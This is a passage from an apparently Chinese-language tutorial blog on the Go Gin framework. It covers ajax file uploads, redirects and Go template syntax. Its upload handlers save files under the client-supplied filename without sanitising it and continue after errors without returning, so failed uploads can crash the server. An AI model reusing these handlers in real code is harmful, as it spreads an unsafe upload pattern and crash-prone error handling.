class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/html&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>upload file<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/s/js/jquery-3.6.3.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myfile&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 绑定upload按钮,按钮被点击后使用ajax提交文件</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> uploadbutton = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;upload&quot;</span>);</span><br><span class="language-javascript">    <span class="hljs-comment">// 按钮被点击</span></span><br><span class="language-javascript">    uploadbutton.<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 获取第一个文件上传 $(&quot;#myfile&quot;)[0] 的第一个文件 (files[0]) --&gt; id为myfile的第一个的第一个文件</span></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> file = $(<span class="hljs-string">&quot;#myfile&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];</span><br><span class="language-javascript">        <span class="hljs-comment">// 创建存放form表单的数据</span></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> form_data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();</span><br><span class="language-javascript">        <span class="hljs-comment">// 将file存进form_data --&gt; 键值对的形式 myfile:file</span></span><br><span class="language-javascript">        form_data.<span class="hljs-title function_">append</span>(<span class="hljs-string">&quot;myfile&quot;</span>,file)</span><br><span class="language-javascript">        <span class="hljs-comment">// 使用ajax提交数据给后端</span></span><br><span class="language-javascript">        $.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/save&quot;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>: form_data,</span><br><span class="language-javascript">            <span class="hljs-attr">contentType</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">processData</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">info</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;msg&quot;</span>).<span class="hljs-property">innerText</span> = info[<span class="hljs-string">&quot;msg&quot;</span>]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>后端接收 agax 传递的数据，再返回 JSON 数据给 ajax：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Saves</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br><span class="hljs-comment">// 接收文件, ajax向form_data里面放的是 myfile:文件,所以这里使用myfile作为key进行接收</span><br>file, err := context.FormFile(<span class="hljs-string">&quot;myfile&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;error: %v&quot;</span>, err)<br>&#125;<br>timestamp := strconv.FormatInt(time.Now().Unix(), <span class="hljs-number">10</span>)<br>ferr := context.SaveUploadedFile(file, <span class="hljs-string">&quot;./uploadfiles/&quot;</span>+timestamp+file.Filename)<br><span class="hljs-keyword">if</span> ferr != <span class="hljs-literal">nil</span> &#123;<br>context.JSON(<span class="hljs-number">200</span>, gin.H&#123;<span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;上传失败&quot;</span>&#125;)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>context.JSON(<span class="hljs-number">200</span>, gin.H&#123;<span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;上传成功&quot;</span>&#125;)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="多个文件-1"><a href="#多个文件-1" class="headerlink" title="多个文件"></a>多个文件</h4><p>agax 上传多个文件：</p><ol><li>agax 遍历将文件存进表单数据 <code>FormData()</code> 后发送</li><li>后端获取表单数据，遍历进行保存</li></ol><p>前端：</p><p><code>class</code> 可以多个，<code>id</code> 只能一个</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;myfile&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;myfile&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;myfile&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>后端：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Saves</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br><span class="hljs-comment">// 接收表单</span><br>form, err := context.MultipartForm()<br><span class="hljs-comment">// 在表单中的多个myfile</span><br>files := form.File[<span class="hljs-string">&quot;myfile&quot;</span>]<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>context.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;error: %v&quot;</span>, err)<br>&#125;<br>timestamp := strconv.FormatInt(time.Now().Unix(), <span class="hljs-number">10</span>)<br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> files &#123;<br>context.SaveUploadedFile(file, <span class="hljs-string">&quot;./uploadfiles/&quot;</span>+timestamp+file.Filename)<br>&#125;<br>context.JSON(<span class="hljs-number">200</span>, gin.H&#123;<span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;上传成功&quot;</span>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403879.png" alt="image-20230403221816492"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403729.png" alt="image-20230403221832914"></p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>响应重定向：请求服务器后，服务器通知浏览器，让浏览器去自主请求其他资源的一种方式。</p><p>浏览器请求 &#x2F;A -&gt; 服务器返回 302 状态码 + Location（ 重定向地址 ）-&gt; 浏览器请求 Location</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br>r.Static(<span class="hljs-string">&quot;/s&quot;</span>, <span class="hljs-string">&quot;static&quot;</span>)<br><span class="hljs-comment">// &quot;/&quot; 重定向到 &quot;/redi&quot;路 径</span><br>r.GET(<span class="hljs-string">&quot;/&quot;</span>, myfunc.Redi)<br>r.GET(<span class="hljs-string">&quot;/redi&quot;</span>, myfunc.Index)<br>r.Run()<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Redi</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>context.Redirect(http.StatusFound, <span class="hljs-string">&quot;/redi&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>context.String(http.StatusOK, <span class="hljs-string">&quot;重定向成功&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>http.Status...</code> 是 http 包中定义的状态码常量</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403319.png" alt="image-20230405092827223"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403506.png" alt="image-20230405092904668"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403611.png" alt="image-20230405092919402"></p><h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><p>在写动态页面的网站的时候，我们常常将不变的部分提出成为模板，可变部分通过后端程序的渲染来生成动态网页，golang也支持模板渲染。</p><p>模板内内嵌的语法支持，全部需要加  <code>&#123;&#123;&#125;&#125;</code>  来标记。</p><p>在模板文件内：</p><ul><li><code>.</code>：上下文</li><li><code>$.</code>：根级的上下文（ <code>.Age</code> 的 <code>$.</code> 代表 <code>.</code> ，用于再循环内表现外部的 ）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(context *gin.Context)</span></span> &#123;<br>name := <span class="hljs-string">&quot;fuming&quot;</span><br>age := <span class="hljs-string">&quot;18&quot;</span><br>hobbys := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;睡觉&quot;</span>, <span class="hljs-string">&quot;吃饭&quot;</span>&#125;<br>p := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any&#123;<br><span class="hljs-string">&quot;name&quot;</span>:   name,<br><span class="hljs-string">&quot;age&quot;</span>:    age,<br><span class="hljs-string">&quot;hobbys&quot;</span>: hobbys,<br>&#125;<br>context.HTML(http.StatusOK, <span class="hljs-string">&quot;index.html&quot;</span>, p)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go">&lt;body&gt;<br>  &#123;&#123;.&#125;&#125;&lt;br&gt;<br>  &#123;&#123;.name&#125;&#125;&lt;br&gt;<br>  &#123;&#123;.age&#125;&#125;&lt;br&gt;<br>  &#123;&#123;.hobbys&#125;&#125;&lt;br&gt;<br><br>  &#123;&#123;<span class="hljs-keyword">range</span> .hobbys&#125;&#125;<br>    &#123;&#123;.&#125;&#125;<br>  &#123;&#123;end&#125;&#125;&lt;br&gt;<br><br>  &#123;&#123;<span class="hljs-keyword">range</span> .hobbys&#125;&#125;<br>    &#123;&#123;<span class="hljs-comment">/*  在这个循环中 &quot;.&quot; 代表 hobbys 中的元素   */</span>&#125;&#125;<br>    &#123;&#123;<span class="hljs-comment">/*  使用 &quot;$.&quot; 表示根级的上下文,即可获取到 .name / .age 元素 */</span>&#125;&#125;<br>    &#123;&#123;$.name&#125;&#125;<br>    &#123;&#123;$.age&#125;&#125;<br>    &#123;&#123;.&#125;&#125;&lt;br&gt;<br>  &#123;&#123;end&#125;&#125;<br><br>  &#123;&#123;<span class="hljs-keyword">range</span> $i,$v := .hobbys&#125;&#125;<br>    &#123;&#123;$i&#125;&#125; - &#123;&#123;$v&#125;&#125; &lt;br&gt;<br>  &#123;&#123;end&#125;&#125;<br><br>&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403253.png" alt="image-20230405095750175"></p><h3 id="符号支持"><a href="#符号支持" class="headerlink" title="符号支持"></a>符号支持</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  &#123;&#123;&quot;My name is fuming .&quot;&#125;&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  &#123;&#123;&#x27;a&#x27;&#125;&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  &#123;&#123;`a`&#125;&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  &#123;&#123;print &quot;My name is fuming .&quot;&#125;&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  &#123;&#123;print nil&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403829.png" alt="image-20230405100226771"></p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">&lt;body&gt;<br>  &#123;&#123;$name := <span class="hljs-string">&quot;fuming&quot;</span>&#125;&#125;<br>  &#123;&#123;$name&#125;&#125;&lt;br&gt;<br>  &#123;&#123;<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;My name is &quot;</span> $name &#125;&#125;<br>&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403429.png" alt="image-20230405100610475"></p><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>golang的模板也支持if的条件判断，当前支持最简单的<code>bool</code>类型和<code>字符串</code>类型的判断。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-keyword">if</span> .condition&#125;&#125;<br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-keyword">if</span> .condition&#125;&#125;<br>&#123;&#123;<span class="hljs-keyword">else</span>&#125;&#125;<br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-keyword">if</span> .condition1&#125;&#125;<br>&#123;&#123;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> .contition2&#125;&#125;<br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><ul><li>当<code>.condition</code>为<code>bool</code>类型的时候，则为<code>true</code>表示执行</li><li>当<code>.condition</code>为<code>string</code>类型的时候，则<code>非空</code>表示执行</li></ul><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403634.png" alt="image-20230405101256563"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  &#123;&#123;if .b&#125;&#125;<br>    &#123;&#123;if .name&#125;&#125;<br>      &#123;&#123;.name&#125;&#125;<br>      &#123;&#123;.age&#125;&#125;<br>      &#123;&#123;.hobbys&#125;&#125;<br>    &#123;&#123;end&#125;&#125;<br>  &#123;&#123;else&#125;&#125;<br>    &#123;&#123;print nil&#125;&#125;<br>  &#123;&#123;end&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>对于逻辑判断可以通过<code>模板函数</code>来完成。</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-keyword">range</span> $i, $v := .slice&#125;&#125;<br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-keyword">range</span> .slice&#125;&#125;<br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><p>外部变量：<code>$</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-keyword">range</span> .slice&#125;&#125;<br>&#123;&#123;$.ArticleContent&#125;&#125;<br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><p>else：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-keyword">range</span> .slice&#125;&#125;<br>    &#123;&#123;.&#125;&#125;<br>&#123;&#123;<span class="hljs-keyword">else</span>&#125;&#125;<br>    暂无数据                 &#123;&#123;<span class="hljs-comment">/* 当 .slice 为空 或者 长度为 0 时会执行这里 */</span>&#125;&#125;<br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  &#123;&#123;range .hobby&#125;&#125;<br>    &#123;&#123;.&#125;&#125;<br>  &#123;&#123;else&#125;&#125;<br>    &#123;&#123;print nil&#125;&#125;<br>  &#123;&#123;end&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403731.png" alt="image-20230405101802334"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403353.png" alt="image-20230405101810433"></p><h3 id="with"><a href="#with" class="headerlink" title="with"></a>with</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name"><span class="hljs-built_in">with</span></span> pipeline &#125;&#125;</span><span class="language-xml"> T1 </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">end</span> &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name"><span class="hljs-built_in">with</span></span> pipeline &#125;&#125;</span><span class="language-xml"> T1 </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">else</span> &#125;&#125;</span><span class="language-xml"> T0 </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">end</span> &#125;&#125;</span><br></code></pre></td></tr></table></figure><p>pipeline 判断条件：获取数据</p><p>如何可以从后端获取相应的数据，那么在里面，<code>.</code> 就代表 pipeline；</p><p>否则执行 T0；</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403795.png" alt="image-20230405104058183"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 后端没有定义 a , 自然无法获取，执行 print 语句 --&gt;</span><br>    &#123;&#123;with .a&#125;&#125;<br>      &#123;&#123;.Name&#125;&#125;<br>      &#123;&#123;.Age&#125;&#125;<br>    &#123;&#123;else&#125;&#125;<br>      &#123;&#123;print nil&#125;&#125;<br>    &#123;&#123;end&#125;&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    &#123;&#123;with .b&#125;&#125;<br>      &#123;&#123;.Name&#125;&#125;<br>      &#123;&#123;.Age&#125;&#125;<br>    &#123;&#123;else&#125;&#125;<br>      &#123;&#123;print nil&#125;&#125;<br>    &#123;&#123;end&#125;&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051403897.png" alt="image-20230405104112867"></p><h3 id="template"><a href="#template" class="headerlink" title="template"></a>template</h3><p>引入另一个目标文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123; &#123;template <span class="hljs-string">&quot;模板名&quot;</span> 传输数据&#125; &#125;<br></code></pre></td></tr></table></figure><p>在被引入的模版文件中需要<code>define</code>名字。</p><p>在 index.html 中引入 test.html 并传入数据：</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  &#123;&#123;template &quot;test.html&quot; .&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;&#123;define &quot;test.html&quot;&#125;&#125;<span class="hljs-comment">&lt;!-- 定义 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>内嵌页面<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123;.&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-comment">&lt;!-- 获取 index.html 中传输过来的数据 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><p><img 